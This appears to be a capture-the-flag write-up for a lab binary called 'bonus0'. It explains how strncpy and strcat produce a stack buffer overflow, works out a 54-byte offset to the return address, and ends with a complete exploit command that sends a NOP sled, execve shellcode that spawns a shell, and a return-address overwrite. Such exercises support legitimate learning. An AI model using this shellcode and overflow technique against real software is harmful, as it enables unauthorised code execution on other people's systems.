We want to overwrite the return address of the main function so it points toward our shellcode inside the buffer of the <p> func

If our 1st parameter is bigger than 20 which is the length of the strncpy the buffer will be non-NULL terminated.
So the 1st parameter will be a result of a join of the 1st and 2nd parameter.

1st parameter => \x90 * 2000 + SHELLCODE
2nd parameter => AAAAAAAAAAAAAA + ADDRESS + A

So first string will be => \x90 * 20 + AAAAAAAAAAAAAA + ADDRESS + A
and the second one will be => AAAAAAAAAAAAAA + ADDRESS + A

The goal here is to set the address at the 54 char of the concat string. Because the offset of the main buffer is 54.
It's a 42 byte long buffer. There is a 4 bytes of SFP. And we see there is 8 bytes of alignement.
42 + 8 + 4 = 54

The offset is 54.

So we will have our 1st string which is 39 bytes long, then a space, then 14*'A', and the address which is at 54 char.

The final buffer after the strcat will be :

\x90 * 20 + 'A' * 14 + ADDRESS(4) + A + ' ' + 'A' * 14 + ADDRESS(4) + A

|                                                       |RETURN ADD|
0                                                       54         58

Our shellcode will still be in the buffer of the <p> function. So we switch the address to point to any \x90 NOP instruction.


(python -c "print('\x90' * 2000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('A' * 14 + '\xbf\xff\xe7\x80'[::-1] + 'A')"; cat) | ~/bonus0
